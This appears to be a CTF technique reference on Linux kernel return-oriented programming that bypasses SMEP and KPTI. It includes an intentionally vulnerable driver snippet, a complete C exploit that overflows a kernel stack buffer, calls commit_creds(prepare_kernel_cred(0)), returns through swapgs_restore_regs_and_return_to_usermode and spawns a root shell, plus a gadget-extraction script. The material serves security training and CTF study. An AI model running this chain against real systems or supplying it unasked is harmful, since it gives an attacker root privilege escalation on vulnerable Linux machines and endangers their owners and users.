---
title: "Kernel ROP and the KPTI Trampoline Return"
category: pwn
subcategory: kernel
type: technique
tags: [kernel, krop, rop, kpti, swapgs-restore-regs-and-return-to-usermode, smep, kaslr, stack-pivot, commit-creds, prepare-kernel-cred, ropgadget, qemu, pwndbg, gef, iretq]
difficulty: hard
summary: "Build a ROP chain from kernel text to call commit_creds(prepare_kernel_cred(0)), then return to user space through swapgs_restore_regs_and_return_to_usermode."
when_to_use:
  - "SMEP is on so ret2usr is impossible"
  - "You control the kernel stack (a stack overflow in a syscall or ioctl handler)"
  - "You have a stack pivot into a region you control"
  - "KPTI is on and a bare `swapgs; iretq` triple faults"
tools: [ROPgadget, ropr, qemu, gdb, pwndbg, gef, gcc]
related: [kernel-ret2usr-creds, kernel-mitigations, kernel-setup-and-debug, kernel-modprobe-path, kernel-exploit-template]
---

## TL;DR

With SMEP on you cannot execute your own code in ring 0, so you build the chain from
gadgets inside kernel `.text`: `pop rdi; ret` / `prepare_kernel_cred` /
`mov rdi, rax; ret` / `commit_creds`. Then, because KPTI unmaps the kernel while in user
mode, you cannot just `iretq` - you must enter
`swapgs_restore_regs_and_return_to_usermode` **past** its first few instructions, so it
does the CR3 switch, `swapgs` and `iretq` for you.

## Recognise it

- `run.sh` has `+smep` and `pti=on` (or no `nopti`).
- The driver has a `copy_from_user` into a stack buffer with an unchecked length.
- Your ret2usr attempt printed `unable to execute userspace code (SMEP?)`.
- Your `swapgs; iretq` made the VM reboot instantly (triple fault = KPTI).

## Vulnerable code shape

```c
static ssize_t vuln_write(struct file *f, const char __user *buf,
                          size_t len, loff_t *off)
{
    char local[0x40];
    /* BUG: len comes straight from userland */
    if (copy_from_user(local, buf, len))
        return -EFAULT;
    return len;
}

/* or the ioctl flavour */
static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    char stack_buf[0x100];
    struct req r;
    copy_from_user(&r, (void __user *)arg, sizeof r);
    copy_from_user(stack_buf, r.buf, r.size);   /* r.size unchecked */
    return 0;
}
```

## Theory

Targets: x86-64 Linux 4.15 - 6.x.

### The chain

```
pop rdi ; ret
0                              ; rdi = NULL  (or &init_task on 6.2+)
prepare_kernel_cred            ; rax = struct cred *
mov rdi, rax ; ret             ; (or: pop rcx; ret + mov rdi, rcx variants)
commit_creds                   ; install it
<KPTI trampoline + offset>
0                              ; dummy rax (popped by the trampoline)
0                              ; dummy rdi (popped by the trampoline)
&get_shell                     ; RIP
user_cs                        ; CS
user_rflags                    ; RFLAGS
user_rsp                       ; RSP
user_ss                        ; SS
```

Finding `mov rdi, rax; ret` is often the hard part. Common substitutes in kernel text:

- `mov rdi, rax ; call rdx` (set `rdx` to a `ret` gadget first)
- `push rax ; pop rdi ; ret`
- `mov rdi, rax ; jmp <something>` followed by an equivalent
- `xchg eax, edi ; ret` (32-bit, zero-extends: fine if the cred pointer's high dword
  is `0xffff8880`-ish... it is not, so this one usually fails)

Search with:

```bash
ROPgadget --binary vmlinux --re "pop rdi" | head
ROPgadget --binary vmlinux --re "mov rdi, rax" | head
ropr vmlinux -R '^pop rdi; ret$'
```

Extracting gadgets from a 40 MB `vmlinux` takes a while; dump once to a file and grep.

### The KPTI trampoline

`swapgs_restore_regs_and_return_to_usermode` in `arch/x86/entry/entry_64.S` looks like:

```asm
swapgs_restore_regs_and_return_to_usermode:
    POP_REGS pop_rdi=0            ; pops r15..rsi  (15 pops)
    /* ... */
    movq    %rsp, %rdi            ; <- your entry point is AFTER this region
    movq    PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp
    pushq   6*8(%rdi)             ; SS
    pushq   5*8(%rdi)             ; RSP
    pushq   4*8(%rdi)             ; RFLAGS
    pushq   3*8(%rdi)             ; CS
    pushq   2*8(%rdi)             ; RIP
    pushq   (%rdi)                ; RDI
    /* SWITCH_TO_USER_CR3_STACK: */
    popq    %rdi
    ...
    SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi
    swapgs
    jmp     .Lnative_iret
```

You do **not** want the `POP_REGS` at the top (it would eat 15 qwords of your chain).
Jump in right at the `mov rdi, rsp` (or a couple of instructions before the CR3
switch). In practice that is `trampoline + 22` or `trampoline + 27` depending on the
build - **disassemble and count**:

```
pwndbg> x/40i swapgs_restore_regs_and_return_to_usermode
```

Find the `mov rdi, rsp` and take that address. From there the code expects, on the
stack, at the moment of the `mov rdi,rsp`:

```
[rsp+0x00]  rax   (popped by the two `pop`s that follow)
[rsp+0x08]  rdi
[rsp+0x10]  RIP
[rsp+0x18]  CS
[rsp+0x20]  RFLAGS
[rsp+0x28]  RSP
[rsp+0x30]  SS
```

Hence the two dummy values before your user context. Some builds want zero dummies,
some want two - confirm by single-stepping the trampoline once in gdb.

### KPTI off

If `nopti` is on the command line, skip all of that: end the chain with
`swapgs; ret`-style gadgets, or just:

```
<kernel gadget: swapgs ; ret>
<kernel gadget: iretq>
RIP / CS / RFLAGS / RSP / SS
```

### Stack pivot

If the overflow is small, pivot. With SMAP on, the new stack must be *kernel* memory:
a `msg_msg` body, a sprayed `kmalloc` chunk you know the address of, or
`push rax ; pop rsp` style gadgets landing on data you control.
`xchg eax, esp ; ret` pivots to a 32-bit address, which in kernel land is almost never
useful.

## Attack

1. Confirm SMEP (`+smep`) and KPTI (`pti=on`) are on.
2. Extract `vmlinux` and dump gadgets:
   `ROPgadget --binary vmlinux > gadgets.txt`.
3. Pick: `pop rdi; ret`, `mov rdi, rax; ret`, and the trampoline entry.
4. Resolve `prepare_kernel_cred`, `commit_creds`, and the trampoline (kallsyms during
   development; leak + offsets for the real run).
5. `save_state()` in `main` before anything else.
6. Find the overflow offset to the saved RIP: send an increasing pattern and read the
   oops `RIP:` value from `dmesg` (or break on the `ret` in gdb).
7. Build the chain and `write()`/`ioctl()` it.
8. The handler returns into your chain; `commit_creds` runs; the trampoline returns you
   to `get_shell()` in ring 3 with uid 0.

## Heap state

```text
the kernel stack at the moment the vulnerable function returns

  rsp+0x00 | pop rdi ; ret                 |  <- overwritten saved RIP
     +0x08 | 0                             |     rdi = NULL
     +0x10 | prepare_kernel_cred           |     rax = new cred
     +0x18 | mov rdi, rax ; ret            |     rdi = cred
     +0x20 | commit_creds                  |     current->cred = cred
     +0x28 | kpti_trampoline + 22          |
     +0x30 | 0                             |  <- dummy rax
     +0x38 | 0                             |  <- dummy rdi
     +0x40 | &get_shell                    |  RIP
     +0x48 | user_cs                       |  CS
     +0x50 | user_rflags                   |  RFLAGS
     +0x58 | user_rsp                      |  RSP
     +0x60 | user_ss                       |  SS


inside the trampoline

  mov  rdi, rsp                  ; rdi -> the block above at +0x30
  mov  rsp, cpu_tss_rw.sp0       ; switch to the trampoline stack
  push 6*8(%rdi)   ; SS
  push 5*8(%rdi)   ; RSP
  push 4*8(%rdi)   ; RFLAGS
  push 3*8(%rdi)   ; CS
  push 2*8(%rdi)   ; RIP
  push   (%rdi)    ; RDI
  pop  %rdi
  SWITCH_TO_USER_CR3_STACK       ; <-- this is why a bare iretq triple faults
  swapgs
  iretq                          ; ring 3, uid 0
```

## Exploit

```c
/* krop.c - kernel ROP with the KPTI trampoline return.
 * Build: gcc -static -O2 -no-pie -o exp krop.c
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE  "/dev/vuln"
#define OVERFLOW_OFF 0x48        /* bytes from the buffer to the saved RIP */

/* ---- offsets from `nm vmlinux`, relative to _text (0xffffffff81000000) ---- */
#define OFF_PREPARE_KERNEL_CRED 0x0C4AE0UL
#define OFF_COMMIT_CREDS        0x0C4700UL
#define OFF_INIT_TASK           0x1A0B840UL
#define OFF_POP_RDI_RET         0x04C7A0UL   /* pop rdi ; ret            */
#define OFF_MOV_RDI_RAX_RET     0x6199EAUL   /* mov rdi, rax ; ret       */
#define OFF_KPTI_TRAMPOLINE     0xC00FC0UL   /* swapgs_restore_regs_...  */
#define KPTI_ENTRY_SKIP         22           /* land on `mov rdi, rsp`   */

#define KERNEL_TEXT_DEFAULT     0xFFFFFFFF81000000UL

static unsigned long user_cs, user_ss, user_rsp, user_rflags;
static unsigned long kbase = KERNEL_TEXT_DEFAULT;

static void die(const char *m)
{
    perror(m);
    exit(1);
}

static void save_state(void)
{
    __asm__ __volatile__(
        "movq %%cs,  %0\n"
        "movq %%ss,  %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

static void get_shell(void)
{
    if (getuid() == 0) {
        puts("[+] uid 0");
        execl("/bin/sh", "sh", NULL);
    }
    puts("[-] still not root");
    exit(1);
}

static unsigned long ksym(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    char line[512], sym[256], type;
    unsigned long val, out = 0;

    if (!f)
        return 0;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "%lx %c %255s", &val, &type, sym) != 3)
            continue;
        if (strcmp(sym, name) == 0) {
            out = val;
            break;
        }
    }
    fclose(f);
    return out;
}

/* Resolve the kernel base. Development: kallsyms. Real run: replace this with
 * whatever info leak the challenge gives you. */
static void resolve_kbase(void)
{
    const char *env = getenv("KBASE");
    unsigned long cc;

    if (env) {
        kbase = strtoul(env, NULL, 0);
    } else {
        cc = ksym("commit_creds");
        if (cc)
            kbase = cc - OFF_COMMIT_CREDS;
    }
    printf("[+] kernel base = %#lx\n", kbase);
}

int main(void)
{
    unsigned long chain[64];
    unsigned char payload[0x400];
    size_t n = 0, len;
    int fd;

    save_state();
    printf("[*] user_cs=%#lx ss=%#lx rsp=%#lx rflags=%#lx\n",
           user_cs, user_ss, user_rsp, user_rflags);

    {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(0, &set);
        sched_setaffinity(0, sizeof set, &set);
    }

    resolve_kbase();

    chain[n++] = kbase + OFF_POP_RDI_RET;
    chain[n++] = 0;                                   /* NULL, or init_task on 6.2+ */
    chain[n++] = kbase + OFF_PREPARE_KERNEL_CRED;
    chain[n++] = kbase + OFF_MOV_RDI_RAX_RET;
    chain[n++] = kbase + OFF_COMMIT_CREDS;
    chain[n++] = kbase + OFF_KPTI_TRAMPOLINE + KPTI_ENTRY_SKIP;
    chain[n++] = 0;                                   /* dummy rax */
    chain[n++] = 0;                                   /* dummy rdi */
    chain[n++] = (unsigned long)get_shell;            /* RIP    */
    chain[n++] = user_cs;                             /* CS     */
    chain[n++] = user_rflags;                         /* RFLAGS */
    chain[n++] = user_rsp;                            /* RSP    */
    chain[n++] = user_ss;                             /* SS     */

    memset(payload, 0x41, sizeof payload);
    memcpy(payload + OVERFLOW_OFF, chain, n * sizeof(unsigned long));
    len = OVERFLOW_OFF + n * sizeof(unsigned long);

    fd = open(DEVICE, O_RDWR);
    if (fd < 0)
        die("open " DEVICE);

    puts("[*] firing the chain");
    if (write(fd, payload, len) < 0)
        die("write");

    /* Unreachable if the trampoline worked. */
    puts("[-] returned without escalating");
    return 1;
}
```

```bash
#!/bin/sh
# gadgets.sh - dump and grep everything you need in one pass.
set -e
ROPgadget --binary vmlinux > gadgets.txt

# the three essential gadgets
grep -m3 ' : pop rdi ; ret'        gadgets.txt
grep -m3 ' : mov rdi, rax ; ret'   gadgets.txt
grep -m3 ' : push rax ; pop rdi ; ret' gadgets.txt

# the symbols and their offsets from _text
TEXT=$(nm vmlinux | awk '$3=="_text"{print "0x"$1}')
for s in prepare_kernel_cred commit_creds init_task \
         swapgs_restore_regs_and_return_to_usermode; do
    A=$(nm vmlinux | awk -v s="$s" '$3==s{print "0x"$1}')
    [ -n "$A" ] && printf '%-45s %s  (off %#x)\n' "$s" "$A" $((A - TEXT))
done
```

## Variants & pitfalls

- **The trampoline skip value.** 22 and 27 are both common; the only correct way is
  `x/40i swapgs_restore_regs_and_return_to_usermode` and taking the address of
  `mov rdi, rsp`. Get this wrong and you land mid-instruction.
- **Dummy values.** Depending on where you enter, 0, 1 or 2 qwords are popped before
  the user context. Single-step the trampoline once and count.
- **`mov rdi, rax; ret` may not exist.** Alternatives: `push rax; pop rdi; ret`, or
  a `pop rcx; ret` + `mov rdi, rcx` pair, or skip the problem by calling
  `commit_creds(&init_cred)` with a `pop rdi` - `init_cred` is a static root cred on
  many builds and removes the need for `prepare_kernel_cred` entirely.
- **KASLR.** Every offset above must be added to the leaked base. Do not mix a leaked
  symbol from one build with offsets from another.
- **FG-KASLR** randomises individual functions, so `leaked_fn - off` no longer gives a
  usable base for *other* functions. Leak a data symbol instead, or go data-only.
- **SMAP** does not block the chain itself (it lives on the kernel stack, which
  `copy_from_user` writes legitimately), but it does block a pivot to a user page.
- **`oops=panic`** hides your mistakes. Remove it locally so you can read the RIP in
  the oops and compute the overflow offset.
- **Stack canaries** (`CONFIG_STACKPROTECTOR`) sit before the saved RIP. If the oops
  says `Kernel stack is corrupted`, you must leak the canary first (usually with an
  OOB read on the same buffer).

## Debugging

```text
pwndbg> x/40i swapgs_restore_regs_and_return_to_usermode
pwndbg> p &swapgs_restore_regs_and_return_to_usermode
pwndbg> b *(swapgs_restore_regs_and_return_to_usermode+22)
pwndbg> p &prepare_kernel_cred
pwndbg> p &commit_creds
pwndbg> p &init_cred
pwndbg> b vuln_write
pwndbg> finish                     # watch the ret consume your chain
pwndbg> x/20gx $rsp
pwndbg> p/x $cr3                   # the trampoline flips the low bit
pwndbg> info registers rdi rax
```

```bash
# Find the overflow offset from an oops.
dmesg | grep -A5 'general protection\|BUG: unable'
# The RIP value is the qword you controlled.
```

## Tools

- `ROPgadget`, `ropr`, `ropper` against `vmlinux`.
- `nm vmlinux` / `vmlinux-to-elf` for symbol offsets.
- `pwndbg` for stepping the trampoline.

## References

- Linux `arch/x86/entry/entry_64.S`:
  `swapgs_restore_regs_and_return_to_usermode`.
- Linux `kernel/cred.c`: `prepare_kernel_cred`, `commit_creds`, `init_cred`.
